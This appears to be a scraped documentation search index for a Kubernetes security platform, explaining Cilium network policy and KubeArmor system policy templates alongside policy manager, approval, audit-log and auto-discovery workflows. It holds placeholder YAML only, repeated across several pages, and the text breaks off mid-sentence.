metadata: name: [policy name] description: [Policy Desciption] spec: endpointSelector: matchLabels: [key1]: [value1] [keyN]: [valueN] ingress: - toPorts: - ports: - port: [port number] protocol: [protocol] - fromEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - fromEntities: - [entity] - fromCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits] Policy Spec Description \u00b6 Here, we will briefly explain how to define the network policy. A network policy starts with base information such as Policy Name Name of the Policy Description Description for the Policy Policy Type Policy Type can be Network-Ingress, Network-Egress and System. Ingress-Policy will apply to all network packets which are entering the endpoint. Egress-Policy will apply to all network packets which are leaving the endpoint. System Policy will restricts behavior at system level. Namespace Namespace will tell in which namespace that policy is going to apply. Default/Node This is used to differentiate between Endpoint Selector(default) and Node Selector(Node). It is called Endpoint Selector because it only applies to labels associated with an Endpoint. Node Selector applies to labels associated with a node in the cluster. Node Selectors can only be used in CiliumClusterwideNetworkPolicy. If you change here from default to node then kind will get changed from CiliumNetworkPolicy to CiliumClusterwideNetworkPolicy Labels Labels are used to select specified endpoints (in most cases it will be pods) and nodes. After creating policy following yaml will be filled. apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: [policy name] description: [Policy Desciption] spec: endpointSelector: matchLabels: [key1]: [value1] [keyN]: [valueN] Egress: In the egress rule, we have 6 different types. First, matchLabels is the same as the selector case, so we can specify the destination based on the labels. toPorts is a list of the port filter, and the port and protocol mean the port number and its protocol respectively. It restricts the ability of an endpoint to emit and/or receive packets on a particular port using a particular protocol. toCIDRSet rules are used to define policies to limit external access to a particular IP range. toEntities rules are used to describe the entities that can be accessed by the selector. The applicable entities are host (the local host), remote-node (other hosts in the cluster than the local host), world (the same as CIDR 0.0.0.0/0) and all. toServices rules can be used to restrict access to the service running in the cluster. But, these services should not use the selector. In other words, it supports the services without the selector only. Thus, if users want to use toServices rules, there should be the service and its endpoints respectively. toFQDNs rules are used to define the policies that have DNS queryable domain names. ingress: - toPorts: - ports: - port: [port number] protocol: [protocol] - fromEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - fromEntities: - [entity] - fromCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits] Ingress: In the ingress rule, we have 4 different types; matchLables, toPorts, fromEntities and fromCIDRSet And these are working as the egress does. ingress: - toPorts: - ports: - port: [port number] protocol: [protocol] - fromEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - fromEntities: - [entity] - fromCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits] Deny Policies \u00b6 Deny policies allows to explicitly restrict certain traffic to and from a Pod. Deny policies take precedence over allow policies. Policy Structure Existing inter-cluster policies will still be allowed as this policy is allowing traffic from everywhere except from \u201cworld\u201d. Host Policies \u00b6 Host policies take the form of a CiliumClusterwideNetworkPolicy with a Node Selector instead of an Default Selector. Host policies apply to all the nodes selected by their Node Selector. Structure of System Policy \u00b6 Policy Specification \u00b6 apiVersion: security.kubearmor.com/v1 kind:KubeArmorPolicy metadata: name: [policy name] namespace: [namespace name] spec: selector: # --> For KubeArmorHostPolicy selector will be nodeSelector matchLabels: [key1]: [value1] [keyN]: [valueN] process: severity: [1-10] matchPaths: - path: [absolute executable path] ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] file: severity: [1-10] matchPaths: - path: [absolute file path] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] network: severity: [1-10] matchProtocols: - protocol: [TCP|tcp|UDP|udp|ICMP|icmp] fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] capabilities: severity: [1-10] matchCapabilities: - capability: [capability name] fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] Policy Spec Description \u00b6 Now, we will briefly explain how to define a system policy. Common A security policy starts with the base information such as apiVersion, kind, and metadata. The apiVersion and kind would be the same in any security policies. In the case of metadata, you need to specify the names of a policy and a namespace where you want to apply the policy. Severity The severity part is somewhat important. You can specify the severity of a given policy from 1 to 10. This severity will appear in alerts when policy violations happen. Selector The selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify (a group of) pods based on labels. Process In the process section, there are 2 types of matches: matchPaths and matchDirectories. You can define specific executables using matchPaths or all executables in specific directories using matchDirectories. In Each match, there are three options. ownerOnly (static action: allow owner only; otherwise block all) If this is enabled, the owners of the executable(s) defined with matchPaths and matchDirectories will be only allowed to execute. recursive If this is enabled, the coverage will extend to the subdirectories of the directory defined with matchDirectories. fromSource If a path is specified in fromSource, the executable at the path will be allowed/blocked to execute the executables defined with matchPaths or matchDirectories. File The file section is quite similar to the process section. The only difference between 'process' and 'file' is the readOnly option. readOnly (static action: allow to read only; otherwise block all) If this is enabled, the read operation will be only allowed, and any other operations (e.g., write) will be blocked. Network In the case of network, there is currently one match type: matchProtocols. You can define specific protocols among TCP, UDP, and ICMP. Capabilities In the case of capabilities, there is currently one match type: matchCapabilities. You can define specific capability names to allow or block using matchCapabilities. Action The action could be Allow, Audit, or Block. Security policies would be handled in a blacklist manner or a whitelist manner according to the action. Thus, you need to define the action carefully. In the case of the Audit action, we can use this action for policy verification before applying a security policy with the Block action. System Policy Specification for Hosts \u00b6 Policy Specification for Host is similar to the previous one. We will point out only differences. In host policy kind will be KubeArmorHostPolicy, not KubeArmorPolicy. NodeSelector The node selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify (a group of) nodes based on labels. Action The action could be Audit or Block in general. In order to use the Allow action, you should define 'fromSource'; otherwise, all Allow actions will be ignored by default. action: [Audit|Block] If 'fromSource' is defined, we can use all actions for specific rules. action: [Allow|Audit|Block]","title":"Policies and Rules"},{"location":"policies-and-rule/policies-and-rule/#policies-and-rules","text":"Accuknox support three types of policies. Network-Ingress, Network-Egress and System Policies. The egress policy restricts the outbound network flows and the other way, the ingress policy operates against the inbound network flows. System Policy restricts the behavior (such as process execution, file access, networking operation and capabilities) of pods and nodes at the system level.","title":"Policies and rules"},{"location":"policies-and-rule/policies-and-rule/#structure-of-network-policy","text":"Network-egress Policy Specification apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: [policy name] description: [Policy Desciption] spec: endpointSelector: matchLabels: [key1]: [value1] [keyN]: [valueN] egress: - toEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - toPorts: - ports: - port: [port number] protocol: [protocol] - toCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits] - toEntities: - [entity] - toServices: - k8sService: serviceName: [service name] namespace: [namespace] - toFQDNs: - matchName: [domain name] - matchPattern: [domain name pattern] Network-ingress Policy Specification apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: [policy name] description: [Policy Desciption] spec: endpointSelector: matchLabels: [key1]: [value1] [keyN]: [valueN] ingress: - toPorts: - ports: - port: [port number] protocol: [protocol] - fromEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - fromEntities: - [entity] - fromCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits]","title":"Structure of network policy"},{"location":"policies-and-rule/policies-and-rule/#policy-spec-description","text":"Here, we will briefly explain how to define the network policy. A network policy starts with base information such as Policy Name Name of the Policy Description Description for the Policy Policy Type Policy Type can be Network-Ingress, Network-Egress and System. Ingress-Policy will apply to all network packets which are entering the endpoint. Egress-Policy will apply to all network packets which are leaving the endpoint. System Policy will restricts behavior at system level. Namespace Namespace will tell in which namespace that policy is going to apply. Default/Node This is used to differentiate between Endpoint Selector(default) and Node Selector(Node). It is called Endpoint Selector because it only applies to labels associated with an Endpoint. Node Selector applies to labels associated with a node in the cluster. Node Selectors can only be used in CiliumClusterwideNetworkPolicy. If you change here from default to node then kind will get changed from CiliumNetworkPolicy to CiliumClusterwideNetworkPolicy Labels Labels are used to select specified endpoints (in most cases it will be pods) and nodes. After creating policy following yaml will be filled. apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: [policy name] description: [Policy Desciption] spec: endpointSelector: matchLabels: [key1]: [value1] [keyN]: [valueN] Egress: In the egress rule, we have 6 different types. First, matchLabels is the same as the selector case, so we can specify the destination based on the labels. toPorts is a list of the port filter, and the port and protocol mean the port number and its protocol respectively. It restricts the ability of an endpoint to emit and/or receive packets on a particular port using a particular protocol. toCIDRSet rules are used to define policies to limit external access to a particular IP range. toEntities rules are used to describe the entities that can be accessed by the selector. The applicable entities are host (the local host), remote-node (other hosts in the cluster than the local host), world (the same as CIDR 0.0.0.0/0) and all. toServices rules can be used to restrict access to the service running in the cluster. But, these services should not use the selector. In other words, it supports the services without the selector only. Thus, if users want to use toServices rules, there should be the service and its endpoints respectively. toFQDNs rules are used to define the policies that have DNS queryable domain names. ingress: - toPorts: - ports: - port: [port number] protocol: [protocol] - fromEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - fromEntities: - [entity] - fromCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits] Ingress: In the ingress rule, we have 4 different types; matchLables, toPorts, fromEntities and fromCIDRSet And these are working as the egress does. ingress: - toPorts: - ports: - port: [port number] protocol: [protocol] - fromEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - fromEntities: - [entity] - fromCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits]","title":"Policy Spec Description"},{"location":"policies-and-rule/policies-and-rule/#deny-policies","text":"Deny policies allows to explicitly restrict certain traffic to and from a Pod. Deny policies take precedence over allow policies. Policy Structure Existing inter-cluster policies will still be allowed as this policy is allowing traffic from everywhere except from \u201cworld\u201d.","title":"Deny Policies"},{"location":"policies-and-rule/policies-and-rule/#host-policies","text":"Host policies take the form of a CiliumClusterwideNetworkPolicy with a Node Selector instead of an Default Selector. Host policies apply to all the nodes selected by their Node Selector.","title":"Host Policies"},{"location":"policies-and-rule/policies-and-rule/#structure-of-system-policy","text":"","title":"Structure of System Policy"},{"location":"policies-and-rule/policies-and-rule/#policy-specification","text":"apiVersion: security.kubearmor.com/v1 kind:KubeArmorPolicy metadata: name: [policy name] namespace: [namespace name] spec: selector: # --> For KubeArmorHostPolicy selector will be nodeSelector matchLabels: [key1]: [value1] [keyN]: [valueN] process: severity: [1-10] matchPaths: - path: [absolute executable path] ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] file: severity: [1-10] matchPaths: - path: [absolute file path] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] network: severity: [1-10] matchProtocols: - protocol: [TCP|tcp|UDP|udp|ICMP|icmp] fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] capabilities: severity: [1-10] matchCapabilities: - capability: [capability name] fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block]","title":"Policy Specification"},{"location":"policies-and-rule/policies-and-rule/#policy-spec-description_1","text":"Now, we will briefly explain how to define a system policy. Common A security policy starts with the base information such as apiVersion, kind, and metadata. The apiVersion and kind would be the same in any security policies. In the case of metadata, you need to specify the names of a policy and a namespace where you want to apply the policy. Severity The severity part is somewhat important. You can specify the severity of a given policy from 1 to 10. This severity will appear in alerts when policy violations happen. Selector The selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify (a group of) pods based on labels. Process In the process section, there are 2 types of matches: matchPaths and matchDirectories. You can define specific executables using matchPaths or all executables in specific directories using matchDirectories. In Each match, there are three options. ownerOnly (static action: allow owner only; otherwise block all) If this is enabled, the owners of the executable(s) defined with matchPaths and matchDirectories will be only allowed to execute. recursive If this is enabled, the coverage will extend to the subdirectories of the directory defined with matchDirectories. fromSource If a path is specified in fromSource, the executable at the path will be allowed/blocked to execute the executables defined with matchPaths or matchDirectories. File The file section is quite similar to the process section. The only difference between 'process' and 'file' is the readOnly option. readOnly (static action: allow to read only; otherwise block all) If this is enabled, the read operation will be only allowed, and any other operations (e.g., write) will be blocked. Network In the case of network, there is currently one match type: matchProtocols. You can define specific protocols among TCP, UDP, and ICMP. Capabilities In the case of capabilities, there is currently one match type: matchCapabilities. You can define specific capability names to allow or block using matchCapabilities. Action The action could be Allow, Audit, or Block. Security policies would be handled in a blacklist manner or a whitelist manner according to the action. Thus, you need to define the action carefully. In the case of the Audit action, we can use this action for policy verification before applying a security policy with the Block action.","title":"Policy Spec Description"},{"location":"policies-and-rule/policies-and-rule/#system-policy-specification-for-hosts","text":"Policy Specification for Host is similar to the previous one. We will point out only differences. In host policy kind will be KubeArmorHostPolicy, not KubeArmorPolicy. NodeSelector The node selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify (a group of) nodes based on labels. Action The action could be Audit or Block in general. In order to use the Allow action, you should define 'fromSource'; otherwise, all Allow actions will be ignored by default. action: [Audit|Block] If 'fromSource' is defined, we can use all actions for specific rules. action: [Allow|Audit|Block]","title":"System Policy Specification for Hosts"},{"location":"policy_audit_logs/overview/","text":"Overview \u00b6 Policy Audit Logs is a Version Control System used to save different versions of a policy so that any version is reviewable at will. click Policy Audit Logs from left navigation Policy Audit logs also make it simple to keep track of and compare policy versions. This means that you may check the details of what changed, who changed what, and the status of the modification at any moment. Note: All the actions that can be performed or the visibility in the policy audit logs is based on the role of the user. If you delete any policy, then audit logs will also get removed. Versions will change only after each approval. It will have different versions of the same policy like v1, v2, and so on.","title":"Overview"},{"location":"policy_audit_logs/overview/#overview","text":"Policy Audit Logs is a Version Control System used to save different versions of a policy so that any version is reviewable at will. click Policy Audit Logs from left navigation Policy Audit logs also make it simple to keep track of and compare policy versions. This means that you may check the details of what changed, who changed what, and the status of the modification at any moment. Note: All the actions that can be performed or the visibility in the policy audit logs is based on the role of the user. If you delete any policy, then audit logs will also get removed. Versions will change only after each approval. It will have different versions of the same policy like v1, v2, and so on.","title":"Overview"},{"location":"policy_audit_logs/policy_audit_log/","text":"Overview \u00b6 Policy Audit Logs is a Version Control System used to save different versions of a policy so that any version is reviewable at will. click Policy Audit Logs from left navigation Policy Audit logs also make it easy to record and compare different policy versions. This means that the details about what changed, who changed what, or the status of the change are reviewable anytime. Policy States \u00b6 There are three primary states in which a policy can be: active , inactive, or approve/deny . It is displayed at the right corner of each policy. Active: Approved policy will be in an active state. The latest change is highlighted in green. Inactive: If the policy is set to the inactive state from the Policy Manager , then the same will be shown here too. approve/deny : If you add any changes to the policy, then the policy will be shifted to Pending state and you can either approve/deny changes. Changes will be highlighted in green. Status of the changes \u00b6 Select any of the rows to see detailed information about the specific policy. There are two states in which a change can be Approved or Denied Approved : The changes which have been approved to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc. Denied : The changes which have been denied to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc. Note: All the actions that can be performed or the visibility in the policy audit logs is based on the role of the user. If you delete any policy, then audit logs will also get removed. Versions will change only after each approval.","title":"Policy audit log"},{"location":"policy_audit_logs/policy_audit_log/#overview","text":"Policy Audit Logs is a Version Control System used to save different versions of a policy so that any version is reviewable at will. click Policy Audit Logs from left navigation Policy Audit logs also make it easy to record and compare different policy versions. This means that the details about what changed, who changed what, or the status of the change are reviewable anytime.","title":"Overview"},{"location":"policy_audit_logs/policy_audit_log/#policy-states","text":"There are three primary states in which a policy can be: active , inactive, or approve/deny . It is displayed at the right corner of each policy. Active: Approved policy will be in an active state. The latest change is highlighted in green. Inactive: If the policy is set to the inactive state from the Policy Manager , then the same will be shown here too. approve/deny : If you add any changes to the policy, then the policy will be shifted to Pending state and you can either approve/deny changes. Changes will be highlighted in green.","title":"Policy States"},{"location":"policy_audit_logs/policy_audit_log/#status-of-the-changes","text":"Select any of the rows to see detailed information about the specific policy. There are two states in which a change can be Approved or Denied Approved : The changes which have been approved to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc. Denied : The changes which have been denied to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc. Note: All the actions that can be performed or the visibility in the policy audit logs is based on the role of the user. If you delete any policy, then audit logs will also get removed. Versions will change only after each approval.","title":"Status of the changes"},{"location":"policy_audit_logs/policy_status/","text":"Policy Status \u00b6 There are three primary states in which a policy can be: active , inactive, or approve/deny . It is displayed at the right corner of each policy. Active: Approved policy will be in an active state. The latest change is highlighted in green. Inactive: If the policy is set to the inactive state from the Policy Manager , then the same will be shown here too. Approve/Deny : If you add any changes to the policy, then the policy will be shifted to Pending state and you can either approve/deny changes. Changes will be highlighted in green.","title":"Policy Status"},{"location":"policy_audit_logs/policy_status/#policy-status","text":"There are three primary states in which a policy can be: active , inactive, or approve/deny . It is displayed at the right corner of each policy. Active: Approved policy will be in an active state. The latest change is highlighted in green. Inactive: If the policy is set to the inactive state from the Policy Manager , then the same will be shown here too. Approve/Deny : If you add any changes to the policy, then the policy will be shifted to Pending state and you can either approve/deny changes. Changes will be highlighted in green.","title":"Policy Status"},{"location":"policy_audit_logs/status_of_changes/","text":"Status of the changes \u00b6 Right click on policy name from the default screen to see details of versions and changes There are two states in which a change can be Approved or Denied Approved : The changes which have been approved to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc. Denied : The changes which have been denied to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc.","title":"Status of changes"},{"location":"policy_audit_logs/status_of_changes/#status-of-the-changes","text":"Right click on policy name from the default screen to see details of versions and changes There are two states in which a change can be Approved or Denied Approved : The changes which have been approved to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc. Denied : The changes which have been denied to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc.","title":"Status of the changes"},{"location":"policy_manager/approve_policies/","text":"Approve Policy \u00b6 After you add the rules to policy, Policy will be shifted to the Pending state. To make it active, you need to approve the policy. Select Policy Manager -> Pending Approval On the Pending Approval list page, Approve your specific policy. Go to Policy Manager -> All Policies list page, You can see recently approved policy with status active .","title":"How to approve policies"},{"location":"policy_manager/approve_policies/#approve-policy","text":"After you add the rules to policy, Policy will be shifted to the Pending state. To make it active, you need to approve the policy. Select Policy Manager -> Pending Approval On the Pending Approval list page, Approve your specific policy. Go to Policy Manager -> All Policies list page, You can see recently approved policy with status active .","title":"Approve Policy"},{"location":"policy_manager/create_and_apply_policies/","text":"Create Policy Manually: \u00b6 From two screens you can create/Add Policies. Add Policy from Cluster Manager Dashboard. \u00b6 Log in to Accuknox select Cluster Manager Dashboard from the left navigation bar. Right Click on any entity such as node and pod. Select Add Policy Create Policy from Policy Manager \u00b6 Log in to Accuknox and select Policy Manager -> All Policies On the All Policies page, select Create Policy Define basic policy parameters \u00b6 Define the basic parameters of the policy before adding the rules. Policy Name Name of the Policy Description Description for the Policy Policy Type Policy Type can be Network-Ingress, Network-Egress, and System. Ingress-Policy will apply to all network packets which are entering the endpoint. Egress-Policy will apply to all network packets which are leaving the endpoint. System Policy will restrict behavior at the system level. To set up the network security select policy type to be Network-ingress or Network-egress. Namespace Namespace will tell in which namespace that policy is going to apply. Default/Node This is used to differentiate between Endpoint Selector(default) and Node Selector(Node). It is called Endpoint Selector because it only applies to labels associated with an Endpoint. Node Selector applies to labels associated with a node in the cluster. Labels Labels are used to select specified endpoints (in most cases it will be pods) and nodes. Create/Add Network Policy \u00b6 To set up the network security policies select policy type to be Network-ingress or Network-egress when you define policy type. select Create/Add Policy -> Policy type -> Network-ingress/Network-egress Create/Add Kubearmor(System) Policy \u00b6 To set up the application security policies select the policy type to be System when you define policy type. select Create/Add Policy \u2192 Policy type -> System Add Rules \u00b6 Once the Policy has been created, You will be directed to the Add rules screen. Another way is to select Policy Manager \u2192 All Policies. Selecting a policy from All Policies list page will expand the policy details and access + icon to add rules. The Add rule interface provides an easy way to add rules to or remove rules from a Policy; Rules will differ based on the policy type you chose. See also: Policies and Rules","title":"Create and apply Policies"},{"location":"policy_manager/create_and_apply_policies/#create-policy-manually","text":"From two screens you can create/Add Policies.","title":"Create Policy Manually:"},{"location":"policy_manager/create_and_apply_policies/#add-policy-from-cluster-manager-dashboard","text":"Log in to Accuknox select Cluster Manager Dashboard from the left navigation bar. Right Click on any entity such as node and pod. Select Add Policy","title":"Add Policy from Cluster Manager Dashboard."},{"location":"policy_manager/create_and_apply_policies/#create-policy-from-policy-manager","text":"Log in to Accuknox and select Policy Manager -> All Policies On the All Policies page, select Create Policy","title":"Create Policy from Policy Manager"},{"location":"policy_manager/create_and_apply_policies/#define-basic-policy-parameters","text":"Define the basic parameters of the policy before adding the rules. Policy Name Name of the Policy Description Description for the Policy Policy Type Policy Type can be Network-Ingress, Network-Egress, and System. Ingress-Policy will apply to all network packets which are entering the endpoint. Egress-Policy will apply to all network packets which are leaving the endpoint. System Policy will restrict behavior at the system level. To set up the network security select policy type to be Network-ingress or Network-egress. Namespace Namespace will tell in which namespace that policy is going to apply. Default/Node This is used to differentiate between Endpoint Selector(default) and Node Selector(Node). It is called Endpoint Selector because it only applies to labels associated with an Endpoint. Node Selector applies to labels associated with a node in the cluster. Labels Labels are used to select specified endpoints (in most cases it will be pods) and nodes.","title":"Define basic policy parameters"},{"location":"policy_manager/create_and_apply_policies/#createadd-network-policy","text":"To set up the network security policies select policy type to be Network-ingress or Network-egress when you define policy type. select Create/Add Policy -> Policy type -> Network-ingress/Network-egress","title":"Create/Add Network Policy"},{"location":"policy_manager/create_and_apply_policies/#createadd-kubearmorsystem-policy","text":"To set up the application security policies select the policy type to be System when you define policy type. select Create/Add Policy \u2192 Policy type -> System","title":"Create/Add Kubearmor(System) Policy"},{"location":"policy_manager/create_and_apply_policies/#add-rules","text":"Once the Policy has been created, You will be directed to the Add rules screen. Another way is to select Policy Manager \u2192 All Policies. Selecting a policy from All Policies list page will expand the policy details and access + icon to add rules. The Add rule interface provides an easy way to add rules to or remove rules from a Policy; Rules will differ based on the policy type you chose. See also: Policies and Rules","title":"Add Rules"},{"location":"policy_manager/edit_and_delete_policies/","text":"Edit Policy Select Policy Manager -> All Policies Click on the name of the policy that you want to edit. On the policy detail screen, you have a lot of options to edit. You can change the details of the policy by clicking on the above pencil edit icon. You can edit & delete the existing rules by accessing the three dots icon appearing on the right end of specific rules. See also: Policies and Rules Delete Policy Select Policy Manager -> All Policies Click the three-dot icon on the right end of a specific row. Click Delete Policy . Click on Confirm button to delete.","title":"Edit and Delete policies"},{"location":"policy_manager/network_and%20_system_policies/","text":"Accuknox enforces application policies and hardening using KubeArmor - our own open-source product that brings AppArmor and SELinux to K8s / Cloud workloads. Additionally, Accuknox builds on top of Cilium to provide full support for identity-based network segmentation for K8s and VM workloads. Network Policy: Network Policies control traffic going in and out of the pods. Cilium implements the Kubernetes Network Policies for L3/L4 level and extends with L7 policies. Cilium policies follow the whitelist model. When a policy is enabled for a pod, all ingress and egress traffic are denied by default unless the policy specification allows specific traffic. Network-Ingress : List of rules which must apply at the ingress of the endpoint, i.e. to all network packets which are entering the endpoint. Network-Egress : List of rules which must apply at the egress of the endpoint, i.e. to all network packets which are leaving the endpoint. Structure of network policy \u00b6 Network-egress Policy Specification: apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: [policy name] description: [Policy Desciption] spec: endpointSelector: matchLabels: [key1]: [value1] [keyN]: [valueN] egress: - toEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - toPorts: - ports: - port: [port number] protocol: [protocol] - toCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits] - toEntities: - [entity] - toServices: - k8sService: serviceName: [service name] namespace: [namespace] - toFQDNs: - matchName: [domain name] - matchPattern: [domain name pattern] Network-ingress Policy Specification: apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: [policy name] description: [Policy Desciption] spec: endpointSelector: matchLabels: [key1]: [value1] [keyN]: [valueN] ingress: - toPorts: - ports: - port: [port number] protocol: [protocol] - fromEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - fromEntities: - [entity] - fromCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits] System Policy : System policies restrict the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. Structure of System Policy \u00b6 Policy Specification \u00b6 apiVersion: security.kubearmor.com/v1 kind:KubeArmorPolicy metadata: name: [policy name] namespace: [namespace name] spec: selector: # --> For KubeArmorHostPolicy selector will be nodeSelector matchLabels: [key1]: [value1] [keyN]: [valueN] process: severity: [1-10] matchPaths: - path: [absolute executable path] ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] file: severity: [1-10] matchPaths: - path: [absolute file path] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] network: severity: [1-10] matchProtocols: - protocol: [TCP|tcp|UDP|udp|ICMP|icmp] fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] capabilities: severity: [1-10] matchCapabilities: - capability: [capability name] fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] See also: Policies and Rules","title":"What are Network and System Policies"},{"location":"policy_manager/network_and%20_system_policies/#structure-of-network-policy","text":"Network-egress Policy Specification: apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: [policy name] description: [Policy Desciption] spec: endpointSelector: matchLabels: [key1]: [value1] [keyN]: [valueN] egress: - toEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - toPorts: - ports: - port: [port number] protocol: [protocol] - toCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits] - toEntities: - [entity] - toServices: - k8sService: serviceName: [service name] namespace: [namespace] - toFQDNs: - matchName: [domain name] - matchPattern: [domain name pattern] Network-ingress Policy Specification: apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: [policy name] description: [Policy Desciption] spec: endpointSelector: matchLabels: [key1]: [value1] [keyN]: [valueN] ingress: - toPorts: - ports: - port: [port number] protocol: [protocol] - fromEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - fromEntities: - [entity] - fromCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits] System Policy : System policies restrict the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level.","title":"Structure of network policy"},{"location":"policy_manager/network_and%20_system_policies/#structure-of-system-policy","text":"","title":"Structure of System Policy"},{"location":"policy_manager/network_and%20_system_policies/#policy-specification","text":"apiVersion: security.kubearmor.com/v1 kind:KubeArmorPolicy metadata: name: [policy name] namespace: [namespace name] spec: selector: # --> For KubeArmorHostPolicy selector will be nodeSelector matchLabels: [key1]: [value1] [keyN]: [valueN] process: severity: [1-10] matchPaths: - path: [absolute executable path] ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] file: severity: [1-10] matchPaths: - path: [absolute file path] readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] matchDirectories: - dir: [absolute directory path] recursive: [true|false] # --> optional readOnly: [true|false] # --> optional ownerOnly: [true|false] # --> optional fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] network: severity: [1-10] matchProtocols: - protocol: [TCP|tcp|UDP|udp|ICMP|icmp] fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] capabilities: severity: [1-10] matchCapabilities: - capability: [capability name] fromSource: # --> optional - path: [absolute exectuable path] action: [Allow|Audit|Block] See also: Policies and Rules","title":"Policy Specification"},{"location":"policy_manager/view_and_apply_auto_discovery_policy/","text":"Auto Discovery is a policy recommendation system that suggests network and system policies based on the collected network and system logs respectively. Currently, Auto-Discovery can discover (i) egress/ingress network policy for Pod-to- Pod, (External)Service, Entity, CIDR, FQDN, HTTP. And In the System perspective, it can discover (ii) process, file, and network-relevant system policy. View Auto Discovered Policies. \u00b6 You can filter Auto Discovered Policies using the following filters: Cluster:- Filter Policies by clusters belonging to your workspace. Namespace: Filter Policies by namespaces belonging to selected clusters Policy-Type: Filter Policies by Policy types. There are 3 Policy types. (i) Network-Ingress (ii) Network-Egress (iii) System Policy Category: Category will give the status of the policies. There are 2 categories. Used: When the Policy is applied from the Auto Discovered Policy Screen, It will go to All Policy Screen and Category will be changed to Used . You can list all used policies with the used category. Ignore: You can list all ignored policies using this filter. Apply Auto Discovered Policies. \u00b6 Select one or more policies from the list Note: The default screen will show all unused policies. Click the \u201cAction\u201d button on the top right corner. There are 3 Actions that can be performed. (i) Apply (ii) Ignore (iii) Deselect all Click Apply . Then Policy will be applied to the cluster. Applied Policy will go to pending approval. Click on the 